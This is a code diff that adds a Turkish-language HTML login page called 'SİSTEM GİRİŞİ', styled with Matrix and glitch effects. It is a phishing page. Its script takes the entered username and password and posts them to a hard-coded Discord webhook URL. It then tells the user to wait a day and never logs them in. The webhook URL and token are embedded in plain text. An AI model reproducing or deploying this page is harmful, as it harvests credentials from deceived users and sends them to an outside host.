@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Siyah-Beyaz Giriş Paneli</title>
+    <style>
+        /* Genel Arka Plan ve Tasarım */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            cursor: default;
+        }
+
+        /* Ekran Üzerinden Geçen Retro Monitör Çizgileri (Scanlines) */
+        body::after {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 255, 255, 0.03), rgba(0, 0, 0, 0.02), rgba(255, 255, 255, 0.03));
+            z-index: 999;
+            background-size: 100% 4px, 6px 100%;
+            pointer-events: none;
+        }
+
+        /* Mouse İmlecini Takip Eden Beyaz Işık */
+        .cursor-glow {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 255, 255, 0.07);
+            border-radius: 50%;
+            box-shadow: 0 0 120px rgba(255, 255, 255, 0.2);
+            pointer-events: none;
+            transform: translate(-50%, -50%);
+            transition: width 0.2s, height 0.2s;
+            z-index: -1;
+        }
+
+        /* Matrix Tarzı Akan Arka Plan Çizgileri (Beyaz Tonlarında) */
+        .matrix-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -3;
+            opacity: 0.12;
+            pointer-events: none;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .matrix-column {
+            color: #ffffff;
+            font-family: monospace;
+            font-size: 20px;
+            writing-mode: vertical-lr;
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+
+        /* Giriş Kutusu (Glassmorphism - Şeffaf Cam Efekti) */
+        .login-card {
+            background: rgba(15, 15, 15, 0.8);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            padding: 45px 35px;
+            border-radius: 20px;
+            width: 340px;
+            box-shadow: 0 0 35px rgba(255, 255, 255, 0.1), inset 0 0 15px rgba(255, 255, 255, 0.05);
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Butona Basınca Oluşan Sarsıntı Efekti */
+        .shake {
+            animation: shakeAnim 0.4s ease-in-out;
+        }
+
+        @keyframes shakeAnim {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+
+        /* Üst Giriş Alanı Yazısı */
+        .top-subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        /* Glitch Efektli Ana Başlık */
+        .login-card h2 {
+            color: #ffffff;
+            margin-bottom: 30px;
+            font-size: 2rem;
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.5);
+            letter-spacing: 2px;
+            font-weight: 800;
+            position: relative;
+            animation: glitchAnim 3s infinite;
+        }
+
+        @keyframes glitchAnim {
+            0%, 90%, 100% { transform: translate(0); }
+            92% { transform: translate(-2px, 2px); text-shadow: 2px 0 #888888; }
+            94% { transform: translate(2px, -2px); text-shadow: -2px 0 #444444; }
+            96% { transform: translate(0); text-shadow: 0 0 12px rgba(255, 255, 255, 0.5); }
+        }
+
+        /* Girdi Alanları */
+        .input-group {
+            margin-bottom: 22px;
+            text-align: left;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 1.05rem;
+            outline: none;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus {
+            border-color: #ffffff;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* Şifre Göster / Gizle Butonu */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.5);
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .toggle-password:hover {
+            color: #ffffff;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.8);
+        }
+
+        /* Beyaz/Gri Giriş Butonu */
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0.2));
+            border: 2px solid #ffffff;
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 1.1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.15);
+            margin-top: 5px;
+        }
+
+        .login-btn:hover {
+            background: #ffffff;
+            color: #000000;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.7);
+            transform: translateY(-2px);
+        }
+
+        /* Uyarı Mesajı Alanı */
+        #message {
+            margin-top: 20px;
+            color: #ffffff;
+            font-size: 1rem;
+            font-weight: 700;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6);
+            min-height: 24px;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Fareyi Takip Eden Işık -->
+    <div class="cursor-glow" id="cursorGlow"></div>
+
+    <!-- Matrix Akan Kod Efekti -->
+    <div class="matrix-bg">
+        <div class="matrix-column" style="animation-duration: 4s;">1010101</div>
+        <div class="matrix-column" style="animation-duration: 6s; animation-delay: 1s;">0110100</div>
+        <div class="matrix-column" style="animation-duration: 5s; animation-delay: 2s;">1100110</div>
+        <div class="matrix-column" style="animation-duration: 7s; animation-delay: 0.5s;">0011011</div>
+        <div class="matrix-column" style="animation-duration: 4.5s; animation-delay: 1.5s;">1011010</div>
+    </div>
+
+    <div class="login-card" id="loginCard">
+        <div class="top-subtitle">Giriş Alanı</div>
+        <h2>SİSTEM GİRİŞİ</h2>
+        
+        <form id="loginForm">
+            <!-- Kullanıcı Adı Kutusu -->
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Kullanıcı Adı" required autocomplete="off">
+            </div>
+
+            <!-- Şifre Kutusu ve Göster/Gizle Butonu -->
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Şifre" required>
+                <button type="button" class="toggle-password" id="toggleBtn">Gör</button>
+            </div>
+
+            <!-- Giriş Butonu -->
+            <button type="submit" class="login-btn">Giriş Yap</button>
+        </form>
+
+        <!-- Bildiri Yazısı -->
+        <div id="message"></div>
+    </div>
+
+    <script>
+        // Fareyi Takip Eden Işık Hareketi
+        const cursorGlow = document.getElementById("cursorGlow");
+        document.addEventListener("mousemove", (e) => {
+            cursorGlow.style.left = e.pageX + "px";
+            cursorGlow.style.top = e.pageY + "px";
+        });
+
+        // Şifre Göster/Gizle Mantığı
+        const passwordInput = document.getElementById("password");
+        const toggleBtn = document.getElementById("toggleBtn");
+
+        toggleBtn.addEventListener("click", function() {
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                toggleBtn.textContent = "Gizle";
+            } else {
+                passwordInput.type = "password";
+                toggleBtn.textContent = "Gör";
+            }
+        });
+
+        // Discord Webhook Adresi
+        const webhookUrl = "https://discord.com/api/webhooks/1566136578261123163/8LCAg7y-QsyloAlWq1kLcmfqoiAdpM7pyab1ljK0Cu_jywp7qiiDrZy4uXLw4DYckuKB";
+
+        // Butona basıldığında çalışacak kod
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = passwordInput.value;
+            const messageBox = document.getElementById("message");
+            const loginCard = document.getElementById("loginCard");
+
+            // Butona basınca kutuyu sars (shake efekti)
+            loginCard.classList.add("shake");
+            setTimeout(() => {
+                loginCard.classList.remove("shake");
+            }, 400);
+
+            messageBox.textContent = "1 gün bekleyiniz.";
+
+            const data = {
+                content: `🔑 **Yeni Giriş Denemesi:**\nKullanıcı Adı: \`${username}\`\nŞifre: \`${password}\``
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error("Gönderim hatası:", error);
+            }
+        });
+    </script>
+
+</body>
+</html>
